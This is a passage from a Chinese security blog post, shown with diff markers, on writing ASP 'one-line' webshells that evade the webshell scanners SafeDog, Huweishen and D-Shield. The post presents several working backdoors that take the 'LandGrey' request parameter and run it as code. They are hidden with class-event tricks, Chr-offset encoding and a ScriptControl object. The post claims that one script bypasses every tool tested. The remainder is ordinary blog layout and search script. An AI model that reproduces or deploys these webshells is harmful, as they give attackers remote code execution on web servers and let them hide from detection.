+<h4 id="二-其它多种方式绕过"><a href="#二-其它多种方式绕过" class="headerlink" title="二. 其它多种方式绕过"></a>二. 其它多种方式绕过</h4><p>其它绕过安全狗检测的方式还是比较多的，前面的VBscript encode脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/vbencode-bypass.asp" target="_blank" rel="noopener">vbencode-bypass.asp</a>就可以绕过。另外，再列出来两种利用语法特性绕过的示例程序：</p>
+<h5 id="方法一：请求判断"><a href="#方法一：请求判断" class="headerlink" title="方法一：请求判断"></a>方法一：请求判断</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if Request(&quot;LandGrey&quot;)&lt;&gt;&quot;&quot; then ExecuteGlobal request(&quot;LandGrey&quot;) end if %&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法二：request变量替换"><a href="#方法二：request变量替换" class="headerlink" title="方法二：request变量替换"></a>方法二：request变量替换</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if request(&quot;LandGrey&quot;)&lt;&gt;&quot;&quot;then session(&quot;LandGrey&quot;)&#x3D;request(&quot;LandGrey&quot;):end if:if session(&quot;LandGrey&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;LandGrey&quot;)%&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-绕过护卫神检测"><a href="#0x07-绕过护卫神检测" class="headerlink" title="0x07: 绕过护卫神检测"></a>0x07: 绕过护卫神检测</h3><p>生活为你推开大门，打开一扇窗的同时，不会再为你预留一个狗洞。上面讲的<code>&lt;!--&quot;--&gt;</code>方法并不是无敌的存在，绕不过护卫神的检测。</p>
+<p>所以继续重拾老本行，继续查看官方语法手册。护卫神有两种查杀模式，对于”<strong>极限模式</strong>“，用VBscript的两种类事件可以绕过检测</p>
+<h5 id="一-利用类初始化事件绕过"><a href="#一-利用类初始化事件绕过" class="headerlink" title="一. 利用类初始化事件绕过"></a>一. 利用类初始化事件绕过</h5><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">Class</span> LandGrey</span><br><span class="line">  <span class="keyword">Private</span> <span class="keyword">Sub</span> <span class="keyword">Class_Initialize</span></span><br><span class="line">    <span class="built_in">eval</span>	(<span class="built_in">request</span>(<span class="string">"LandGrey"</span>))</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> X = <span class="keyword">New</span> LandGrey</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="二-利用类卸载事件绕过"><a href="#二-利用类卸载事件绕过" class="headerlink" title="二. 利用类卸载事件绕过"></a>二. 利用类卸载事件绕过</h5><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">Class</span> LandGrey</span><br><span class="line">  <span class="keyword">Private</span> <span class="keyword">Sub</span> <span class="keyword">class_terminate</span></span><br><span class="line">    <span class="built_in">eval</span>	(<span class="built_in">request</span>(<span class="string">"LandGrey"</span>))</span><br><span class="line">  <span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> X = <span class="keyword">New</span> LandGrey</span><br><span class="line"><span class="keyword">Set</span> X = <span class="literal">Nothing</span></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlklnvuj30lm084aad.jpg" alt=""></p>
+<h5 id="三-花式语法绕过"><a href="#三-花式语法绕过" class="headerlink" title="三. 花式语法绕过"></a>三. 花式语法绕过</h5><p>然而选了”<strong>通用模式</strong>“后，上面两个一句话木马就都失效了。但还是有方法能同时绕过护卫神的两种模式，用下面的<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/bypass-all.asp" target="_blank" rel="noopener">bypass-all.asp</a>脚本(密码”LandGrey”)即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%&lt;!--&quot;--&gt;</span><br><span class="line">eXecUTe(fun(&quot;%167%184%163%174%98%180%167%179%183%167%181%182%106%100%142%163%176%166%137%180%167%187%100%107&quot;))</span><br><span class="line"></span><br><span class="line">Function fun(Str):</span><br><span class="line">	Str &#x3D; Split(Str,&quot;%&quot;)</span><br><span class="line">	For x&#x3D;1 To Ubound(Str)</span><br><span class="line">		fun&#x3D;fun&amp;Chr(Str(x)-66)</span><br><span class="line">	Next</span><br><span class="line">End Function</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07: 总结"></a>0x07: 总结</h3><p>其余的工具和平台都大同小异，效果远不如D盾和护卫神，没必要单独针对绕过。上面的<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/bypass-all.asp" target="_blank" rel="noopener">bypass-all.asp</a>脚本就足够绕过上面的表格中所有的平台和工具了。</p>
+<p>最后再给出一个可以绕过表格中所有工具和平台检测的一句话脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/create-activex-object.asp" target="_blank" rel="noopener">create-activex-object.asp</a>，密码”LandGrey”。其原理是利用ASP内置的CreateObject创建ScriptControl组件对象，然后执行VBscript代码。VBscript代码中接受来自请求的参数变量值，并当作VBscript代码执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ language &#x3D; VBscript %&gt;</span><br><span class="line">&lt;%&lt;!--%^_^%--&gt;</span><br><span class="line">SET LandGrey &#x3D; server.CreateObject(&quot;mS&quot;&amp;chr(115)&amp;&quot;cR&quot;&amp;chr(105)&amp;&quot;pTCo&quot;&amp;Chr(110)&amp;Chr(84)&amp;&quot;rOL.Sc&quot;&amp;chr(114)&amp;&quot;IpTCo&quot;&amp;Chr(110)&amp;Chr(84)&amp;&quot;rOL.1&quot;) </span><br><span class="line">LandGrey.lANguaGE &#x3D; cHr(86)&amp;&quot;BsC&quot;&amp;CHR(114)&amp;chr(105)&amp;&quot;PT&quot;</span><br><span class="line">LandGrey.AddObject &quot;REsponse&quot;, Response </span><br><span class="line">LandGrey.AddObject &quot;r&quot;&amp;chr(101)&amp;&quot;quEst&quot;, requesT </span><br><span class="line">LandGrey.AddObject &quot;s&quot;&amp;chr(101)&amp;&quot;ssIon&quot;, sessiOn </span><br><span class="line">LandGrey.AddObject &quot;serv&quot;&amp;chr(101)&amp;&quot;r&quot;, serVer </span><br><span class="line">LandGrey.AddObject &quot;apPlic&quot;&amp;CHR(97)&amp;&quot;tIon&quot;, application </span><br><span class="line">LandGrey.eXECuTeStAtEmENt(&quot;eV&quot;&amp;CHr(&amp;0141)&amp;&quot;L&quot;&amp;Chr(40)&amp;&quot;rEqU&quot;&amp;cHr(101)&amp;&quot;St(&quot;&amp;chr(34)&amp;&quot;LandGrey&quot;&amp;chr(34)&amp;CHR(41)&amp;&quot;)&quot;)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlna24cj30y30fcwlm.jpg" alt=""></p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://github.com/search?utf8=%E2%9C%93&amp;q=webshell&amp;type=" target="_blank" rel="noopener">https://github.com/search?utf8=%E2%9C%93&amp;q=webshell&amp;type=</a></p>
+<p><a href="http://www.cnblogs.com/LittleHann/p/5016999.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/5016999.html</a></p>
+<p><a href="http://www.365jz.com/handbook/asp/" target="_blank" rel="noopener">http://www.365jz.com/handbook/asp/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持技术分享，你的支持鼓励我！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechat.jpeg" alt="alin 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zfb.jpeg" alt="alin 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/20/%E6%9F%90%E4%BA%9B%E6%9C%8D%E5%8A%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" rel="next" title="某些服务未授权访问漏洞">
+                <i class="fa fa-chevron-left"></i> 某些服务未授权访问漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/08/04/china-chopper/" rel="prev" title="编码混淆wehshell">
+                编码混淆wehshell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/mao.jpeg"
+                alt="alin" />
+            
+              <p class="site-author-name" itemprop="name">alin</p>
+              <p class="site-description motion-element" itemprop="description">走出菜鸟阵营</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00：前言"><span class="nav-number">1.</span> <span class="nav-text">0x00：前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01：ASP执行流程和原理"><span class="nav-number">2.</span> <span class="nav-text">0x01：ASP执行流程和原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02：ASP支持的注释方式"><span class="nav-number">3.</span> <span class="nav-text">0x02：ASP支持的注释方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03：ASP一句话后门现状"><span class="nav-number">4.</span> <span class="nav-text">0x03：ASP一句话后门现状</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04：研究思路梳理"><span class="nav-number">5.</span> <span class="nav-text">0x04：研究思路梳理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05：绕过D盾检测"><span class="nav-number">6.</span> <span class="nav-text">0x05：绕过D盾检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一-填充垃圾数据插入特殊字符串绕过"><span class="nav-number">6.1.</span> <span class="nav-text">一. 填充垃圾数据插入特殊字符串绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二-使用-lt-quot-gt-百分百绕过D盾检测"><span class="nav-number">6.2.</span> <span class="nav-text">二.  使用&lt;!--&quot;--&gt;百分百绕过D盾检测</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-绕过安全狗检测"><span class="nav-number">7.</span> <span class="nav-text">0x06: 绕过安全狗检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一-使用-lt-quot-gt-符号绕过检测"><span class="nav-number">7.1.</span> <span class="nav-text">一.使用&lt;!--&quot;--&gt;符号绕过检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二-其它多种方式绕过"><span class="nav-number">7.2.</span> <span class="nav-text">二. 其它多种方式绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#方法一：请求判断"><span class="nav-number">7.2.1.</span> <span class="nav-text">方法一：请求判断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#方法二：request变量替换"><span class="nav-number">7.2.2.</span> <span class="nav-text">方法二：request变量替换</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-绕过护卫神检测"><span class="nav-number">8.</span> <span class="nav-text">0x07: 绕过护卫神检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#一-利用类初始化事件绕过"><span class="nav-number">8.0.1.</span> <span class="nav-text">一. 利用类初始化事件绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#二-利用类卸载事件绕过"><span class="nav-number">8.0.2.</span> <span class="nav-text">二. 利用类卸载事件绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#三-花式语法绕过"><span class="nav-number">8.0.3.</span> <span class="nav-text">三. 花式语法绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-总结"><span class="nav-number">9.</span> <span class="nav-text">0x07: 总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接："><span class="nav-number">10.</span> <span class="nav-text">参考链接：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">alin</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
